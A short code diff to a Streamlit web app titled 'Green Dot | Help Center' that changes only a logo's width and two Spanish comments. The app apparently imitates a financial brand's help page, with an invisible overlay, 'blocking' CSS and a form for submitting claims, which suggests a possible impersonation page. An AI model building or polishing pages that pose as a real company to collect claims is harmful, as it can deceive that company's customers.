@@ -25,7 +25,7 @@ st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_ico
 
 # --- CSS DE AJUSTE DE LOGO Y BLOQUEO ---
 st.markdown("""<style>
-/* 1. Capa invisible ajustada al nuevo tamaño del logo */
+/* 1. Capa invisible ajustada al tamaño del logo */
 .stApp::before {
     content: '';
     position: absolute;
@@ -92,8 +92,8 @@ input {
 </style>""", unsafe_allow_html=True)
 
 if os.path.exists('logo.svg'):
-    # Logo aumentado a 280px para mayor visibilidad
-    st.image('logo.svg', width=280)
+    # Logo ajustado a 250px según solicitud
+    st.image('logo.svg', width=250)
 
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
